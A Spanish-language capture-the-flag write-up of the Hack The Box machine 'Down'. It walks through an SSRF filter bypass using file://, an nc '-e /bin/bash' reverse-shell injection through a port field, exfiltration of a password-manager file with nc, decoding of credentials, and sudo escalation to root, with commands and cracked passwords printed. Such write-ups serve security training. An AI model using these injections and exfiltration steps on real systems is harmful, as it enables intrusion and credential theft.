---
tags:
title: Down- Easy (HTB)
permalink: /Down-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p22,80 10.129.226.140
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-03 15:43 -0300
Nmap scan report for 10.129.226.140
Host is up (1.8s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f6:cc:21:7c:ca:da:ed:34:fd:04:ef:e6:f9:4c:dd:f8 (ECDSA)
|_  256 fa:06:1f:f4:bf:8c:e3:b0:c8:40:21:0d:57:06:dd:11 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Is it down or just me?
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.94 seconds
```


## Website

En la web principal se puede ver un campo en el que puedo colocar una dirección `url` y muestra si la misma esta activa o no.

![image-center](/assets/images/Pasted image 20260203154605.png)

Veo que por ejemplo al colocar mi dirección, la petición la recibo.

![image-center](/assets/images/Pasted image 20260203184720.png)

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.226.140 - - [03/Feb/2026 18:47:28] "GET / HTTP/1.1" 200 -
```
## Shell as www-data

Intercepte la petición e intente usar el protocolo `file`, pero sin éxito no puedo pasar la validación.

![image-center](/assets/images/Pasted image 20260203160339.png)
### Bypass SSRF protocol

Sin embargo, al parecer, valida que únicamente el campo empiece por `http://` o `https://`.

![image-center](/assets/images/Pasted image 20260203160405.png)

De manera que puedo colocar `http://` por ejemplo y luego un espacio, donde puedo usar el protocolo file para poder pasar la validación, y asi pude ver el contenido del `/etc/passwd`.

![image-center](/assets/images/Pasted image 20260203160429.png)

### Command injection

Intente hacer lo mismo viendo el código fuente del `index.php`.

```php
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Is it down or just me?</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <header>
        <img src="/logo.png" alt="Logo">
        <h2>Is it down or just me?</h2>
    </header>

    <div class="container">

<?php
if ( isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp' ) {
  echo '<h1>Is the port refused, or is it just you?</h1>
        <form id="urlForm" action="index.php?expertmode=tcp" method="POST">
            <input type="text" id="url" name="ip" placeholder="Please enter an IP." required><br>
            <input type="number" id="port" name="port" placeholder="Please enter a port number." required><br>
            <button type="submit">Is it refused?</button>
        </form>';
} else {
  echo '<h1>Is that website down, or is it just you?</h1>
        <form id="urlForm" action="index.php" method="POST">
            <input type="url" id="url" name="url" placeholder="Please enter a URL." required><br>
            <button type="submit">Is it down?</button>
        </form>';
}

if ( isset($_GET['expertmode']) && $_GET['expertmode'] === 'tcp' && isset($_POST['ip']) && isset($_POST['port']) ) {
  $ip = trim($_POST['ip']);
  $valid_ip = filter_var($ip, FILTER_VALIDATE_IP);
  $port = trim($_POST['port']);
  $port_int = intval($port);
  $valid_port = filter_var($port_int, FILTER_VALIDATE_INT);
  if ( $valid_ip && $valid_port ) {
    $rc = 255; $output = '';
    $ec = escapeshellcmd("/usr/bin/nc -vz $ip $port");
    exec($ec . " 2>&1",$output,$rc);
    echo '<div class="output" id="outputSection">';
    if ( $rc === 0 ) {
      echo "<font size= 1>It is up. It's just you! ð</font><br><br>";
      echo '<p id="outputDetails"><pre>'.htmlspecialchars(implode("\n",$output)).'</pre></p>';
    } else {
      echo "<font size= 1>It is down for everyone! ð</font><br><br>";
      echo '<p id="outputDetails"><pre>'.htmlspecialchars(implode("\n",$output)).'</pre></p>';
    }
  } else {
    echo '<div class="output" id="outputSection">';
    echo '<font color=red size= 1>Please specify a correct IP and a port between 1 and 65535.</font>';
  }
} elseif (isset($_POST['url'])) {
  $url = trim($_POST['url']);
  if ( preg_match('|^https?://|',$url) ) {
    $rc = 255; $output = '';
    $ec = escapeshellcmd("/usr/bin/curl -s $url");
    exec($ec . " 2>&1",$output,$rc);
    echo '<div class="output" id="outputSection">';
    if ( $rc === 0 ) {
      echo "<font size= 1>It is up. It's just you! ð</font><br><br>";
      echo '<p id="outputDetails"><pre>'.htmlspecialchars(implode("\n",$output)).'</pre></p>';
    } else {
      echo "<font size= 1>It is down for everyone! ð</font><br><br>";
    }
  } else {
    echo '<div class="output" id="outputSection">';
    echo '<font color=red size= 1>Only protocols http or https allowed.</font>';
  }
}
?>

</div>
</div>
<footer>Â© 2024 isitdownorjustme LLC</footer>
</body>
</html>
```

En el mismo se puede ver que si usamos el parámetro `expertmode` y lo igualamos a `tcp` podemos indicar una `ip` y un `puerto` determinado, en el cual el sistema se encarga de enviar una conexión para confirmar si el sistema esta activo.
La vulnerabilidad de este código es en como se usa la función `escapeshellcmd()`, haciendo que la misma escape caracteres como `; & |`, etc.
Esta validación se aplica al enviar la conexión con `nc`, pero sin embargo en la misma no escapa los espacios, por lo que en el campo `port` puedo colocar un puerto, por ejemplo el `2222` y luego un espacio seguido de un `-e /bin/bash`, de manera que la consulta quedaría algo como `nc -vz 10.10.17.19 2222 -e /bin/bash`, enviando así una shell a mi maquina.


Para eso primero intercepto la peticion.

![image-center](/assets/images/Pasted image 20260203161635.png)
### Shell

Y en `Burpsuite` la modifico por lo que quedaría así:

![image-center](/assets/images/Pasted image 20260203162147.png)

Y desde mi listener `nc` veo que recibo la conexión como el usuario `www-data`.

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.226.140] 44416
whoami
www-data
```

```bash
www-data@down:/var/www/html$ cat user_aeT1xa.txt
d4bc94b386ef7c8113698a8c4951cacd
```
## Shell as aleks
### pswm

Viendo en el directorio del usuario `aleks` veo que esta un archivo `pswm`, el cual es una especie de administrador de contraseñas de linea de comandos escrito en `Python`.

```bash
www-data@down:/home/aleks/.local/share/pswm$ ls -la
total 12
drwxrwxr-x 2 aleks aleks 4096 Sep 13  2024 .
drwxrwxr-x 3 aleks aleks 4096 Sep 13  2024 ..
-rw-rw-r-- 1 aleks aleks  151 Sep 13  2024 pswm
```

Como se puede ver el mismo parece tener credenciales almacenadas y codificadas.

```bash
www-data@down:/home/aleks/.local/share/pswm$ cat pswm; echo
e9laWoKiJ0OdwK05b3hG7xMD+uIBBwl/v01lBRD+pntORa6Z/Xu/TdN3aG/ksAA0Sz55/kLggw==*xHnWpIqBWc25rrHFGPzyTg==*4Nt/05WUbySGyvDgSlpoUw==*u65Jfe0ml9BFaKEviDCHBQ==
```

Así que para decodificar el archivo use [este script](https://github.com/repo4Chu/pswm-decoder/blob/main/pswm-decoder.py) en Python. Pero para eso primero necesito transferir el archivo a mi maquina.
### Transfer file

Me puse en escucha con `nc` a la espera del archivo.

```bash
nc -nlvp 4444 > pswm
```

Y desde la shell, me conecte a mi `ip` y envié el mismo.

```bash
www-data@down:/home/aleks/.local/share/pswm$ nc 10.10.17.19 4444 < pswm 
```

Ahora si, usando el script, lo ejecute, aclaro que modifique la ruta donde se encontraba el `pswm`, y así me dio la password del usuario `aleks`.

```bash
python3 pswm-decoder.py 
Password: flower
Decoded text:
pswm    aleks   flower
aleks@down      aleks   1uY3w22uc-Wr{xNHR~+E
```

```bash
ssh aleks@10.129.226.140
<SNIP>
aleks@down:~$
```
## Shell as root

### Sudo privileges

Viendo los privilegios `sudo` de este usuario veo que puede ejecutar cualquier comando como `root` o cualquier usuario del sistema.

```bash
aleks@down:~$ sudo -l
[sudo] password for aleks: 
Matching Defaults entries for aleks on down:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User aleks may run the following commands on down:
    (ALL : ALL) ALL
```
### Shell

Por lo que para convertirme en `root` puedo usar el siguiente comando o usar `sudo -i`
```bash
aleks@down:~$ sudo su 
root@down:/home/aleks# cat /root/root.txt
87bb9869a311b8abb5fb4d3c7248fdcb
```

`~Happy Hacking.`